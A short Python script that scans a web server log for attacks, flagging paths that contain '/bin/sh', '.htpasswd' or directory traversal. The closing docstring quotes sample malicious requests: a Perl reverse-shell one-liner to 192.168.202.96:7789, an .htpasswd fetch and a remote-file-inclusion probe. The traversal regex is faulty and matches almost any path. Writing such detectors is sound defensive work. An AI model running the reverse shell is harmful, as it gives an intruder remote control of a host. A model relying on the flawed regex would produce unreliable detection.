import re
from datetime import datetime

with open("server.log") as s:
    file = s.readlines()

    for line in file:
        isBad = False
        attack= ""
        field = line.split("\t")
        time = float(field[0])
        time = datetime.fromtimestamp(time).strftime('%Y-%m-%d %H:%M:%S')
        src_ip_port = field[2] + ":" + field[3]
        dst_ip_port = field[4] + ":" + field[5]
        request_type = field[7]
        host_address = field[8]
        path = field[9]
        uri = host_address + path
        browser_string = field[10]
        response_code = field[13] + field[14]
        if re.match(".*\/bin\/sh.*", path):
            print("found /bin/sh - %s" % path)
            isBad=True
            attack="Shell Execution"
        elif re.match(".*\.htpasswd.*",path):
            print("found htpasswd - %s" % path)
            isBad=True
            attack="Password File"
        elif re.match(".*[../]+.*",path):
            print ("directory traversal %s" % line)
            isBad=True
            attack="Directory Traversal"
        if isBad:
            print("%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s" % (time,src_ip_port,dst_ip_port,request_type,uri,browser_string,response_code,isBad,attack))


"""
/bin/sh -c "echo 'YYY'; perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.202.96:7789");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'; echo 'YYY'"
/.svn/text-base/.htpasswd.svn-base
/OpenSiteAdmin/scripts/classes/DatabaseManager.php?path=@RFIURL\x00
"""